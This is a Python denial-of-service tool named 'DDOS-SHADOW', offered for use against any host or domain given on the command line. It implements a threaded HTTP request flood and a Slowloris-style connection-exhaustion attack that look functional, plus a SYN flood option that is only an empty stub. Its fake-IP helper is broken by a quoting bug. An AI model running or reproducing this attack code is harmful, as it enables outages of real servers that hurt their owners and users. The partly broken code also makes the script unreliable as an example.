import re
import os
import sys
import json
import time
import string
import signal
import http.client
import urllib.parse
from random import *
from socket import *
from struct import *
from threading import *
from argparse import ArgumentParser, RawTextHelpFormatter

RED     = '\033[31m'
GREEN   = '\033[32m'
YELLOW  = '\033[33m'
BLUE    = '\033[34m'
CYAN    = '\033[36m'
BOLD    = '\033[1m'
ENDC    = '\033[0m'

def show_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"{RED}{BOLD}")
    print(r" ██████╗  ██████╗  ██████╗ ███████╗")
    print(r" ██╔══██╗ ██╔══██╗██╔═══██╗██╔════╝")
    print(r" ██║  ██║ ██║  ██║██║   ██║███████╗")
    print(r" ██║  ██║ ██║  ██║██║   ██║╚════██║")
    print(r" ██████╔╝ ██████╔╝╚██████╔╝███████║")
    print(r" ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝")
    print(f"{YELLOW}      Created by Shadow (Broken Code){ENDC}")
    print(f"{CYAN}-----------------------------------------------{ENDC}")
    print(f"{BLUE}[*] System: Kali Linux / Linux Environment")
    print(f"[*] Version: 3.0 (Updated Edition){ENDC}\n")

try:
    import requests
    import colorama
    from termcolor import colored, cprint
except ImportError:
    if os.name == 'posix':
        print(f"{YELLOW}[!] Installing missing modules...{ENDC}")
        os.system('sudo pip install colorama termcolor requests')
        sys.exit(f"{GREEN}[+] Done. Please restart the script.{ENDC}")
    else:
        sys.exit("[-] Please install: pip install colorama termcolor requests")

if os.name == 'nt':
    colorama.init()

signal.signal(signal.SIGFPE, signal.SIG_DFL)

def fake_ip():
    while True:
        ips = [str(randrange(0, 256)) for i in range(4)]
        if ips[0] == "127": continue
        return '.join(ips)'
        break

def check_tgt(args):
    tgt = args.d
    try:
        ip = gethostbyname(tgt)
        return ip
    except:
        sys.exit(cprint(f'[-] Error: Can\'t resolve host {tgt}', 'red'))

def add_useragent():
    try:
        with open("./ua.txt", "r") as fp:
            return re.findall(r"(.+)\n", fp.read())
    except FileNotFoundError:
        return [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
        ]

def add_bots():
    return [
        'http://www.bing.com/search?q=%40&count=50&first=0',
        'http://www.google.com/search?hl=en&num=100&q=intext%3A%40&ie=utf-8'
    ]

class Pyslow:
    def __init__(self, tgt, port, to, threads, sleep):
        self.tgt = tgt
        self.port = port
        self.to = to
        self.threads = threads
        self.sleep = sleep
        self.method = ['GET', 'POST']
        self.pkt_count = 0

    def mypkt(self):
        text = f"{choice(self.method)} /{randint(1, 999999999)} HTTP/1.1\r\n" \
               f"Host: {self.tgt}\r\n" \
               f"User-Agent: {choice(add_useragent())}\r\n" \
               f"Content-Length: 42\r\n"
        return text.encode('utf-8')

    def building_socket(self):
        try:
            sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
            sock.settimeout(self.to)
            sock.connect((self.tgt, int(self.port)))
            self.pkt_count += 3
            if sock:
                sock.send(self.mypkt())
                self.pkt_count += 1
            return sock
        except Exception:
            return None

    def doconnection(self):
        socks = 0
        lsocks = []
        cprint('[*] Building socket connections...', 'blue')
        while socks < (int(self.threads)):
            sock = self.building_socket()
            if sock:
                lsocks.append(sock)
                socks += 1
            if socks >= int(self.threads): break
        
        cprint(f'[+] Status: Sent {self.pkt_count} packets. Sleeping...', 'green')
        time.sleep(self.sleep)

req_count = 0
class Requester(Thread):
    def __init__(self, tgt):
        Thread.__init__(self)
        self.tgt = tgt
        self.port = 443 if urllib.parse.urlparse(self.tgt).scheme == 'https' else 80
        self.ssl = True if self.port == 443 else False
        self.lock = Lock()

    def run(self):
        global req_count
        try:
            if self.ssl:
                conn = http.client.HTTPSConnection(self.tgt, self.port)
            else:
                conn = http.client.HTTPConnection(self.tgt, self.port)
            
            method = choice(['GET', 'POST'])
            url = f"{self.tgt}?{randint(1,9999)}"
            conn.request(method, url)
            with self.lock:
                req_count += 1
            print(colored(f"[+] Shadow-Engine: Sent {req_count} HTTP requests", "green"))
        except:
            pass

class Synflood(Thread):
    def __init__(self, tgt, ip, sock=None):
        Thread.__init__(self)
        self.tgt = tgt
        self.ip = ip
        self.lock = Lock()
        self.sock = sock

    def run(self):
        global sent_syn_packets
        try:
            pass
        except:
            pass

def main():
    show_banner()
    parser = ArgumentParser(
        usage='./%(prog)s -d [target] [options]',
        formatter_class=RawTextHelpFormatter,
        prog='DDOS-SHADOW'
    )
    options = parser.add_argument_group('Required', '')
    options.add_argument('-d', metavar='<target>', help='Target IP or Domain')
    options.add_argument('-T', metavar='<int>', default=1000, help='Threads (default 1000)')
    
    attack = parser.add_argument_group('Attack Types', '')
    attack.add_argument('-Request', action='store_true', help='HTTP Request Flood')
    attack.add_argument('-Synflood', action='store_true', help='SYN Flood Attack')
    attack.add_argument('-Pyslow', action='store_true', help='Slowloris Attack')

    args = parser.parse_args()

    if not args.d:
        parser.print_help()
        sys.exit()

    tgt_ip = check_tgt(args)

    if args.Request:
        print(f"{BLUE}[*] Initializing Shadow-Request on: {RED}{args.d}{ENDC}")
        while True:
            for x in range(int(args.T)):
                t = Requester(args.d)
                t.daemon = True
                t.start()

    elif args.Pyslow:
        print(f"{BLUE}[*] Initializing Slow-Attack on: {RED}{args.d}{ENDC}")
        while True:
            worker = Pyslow(args.d, 80, 5.0, args.T, 10)
            worker.doconnection()

    else:
        print(f"{YELLOW}[!] Please select an attack type (-Request, -Pyslow, or -Synflood){ENDC}")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(f"\n{RED}[-] Operation cancelled by Shadow.{ENDC}")